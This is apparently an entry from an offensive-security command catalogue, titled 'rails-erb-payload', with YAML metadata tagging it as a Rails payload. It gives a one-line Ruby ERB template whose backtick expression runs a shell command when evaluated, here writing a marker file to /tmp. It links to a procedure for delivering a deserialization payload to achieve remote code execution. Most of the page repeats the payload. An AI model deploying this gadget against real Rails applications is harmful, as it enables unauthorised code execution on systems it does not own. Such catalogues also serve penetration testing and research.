---
data: erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
tags:
  - rails
  - payload
type: command
executor: ruby
platforms:
  - Linux
id: 4563b275-1516-4601-8953-7ee4b33841b8
created_at: '2025-12-11T06:10:40.419Z'
updated_at: '2025-12-11T06:10:40.419Z'
verified: false
validated: true
submitted: true
---
# rails-erb-payload

## Command

```ruby
erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
```

## Description

Creates an ERB object with a template that executes a shell command upon evaluation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<%= `echo vakzz was here > /tmp/vakzz` %>` | ERB template with command | Yes |

## Examples

### Basic Usage

```ruby
erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
```

## Expected Output

An ERB object.

## Related

- [[commands/rails-deprecated-proxy]]
- [[procedures/Generate-and-Deliver-Deserialization-Payload-for-RCE]]
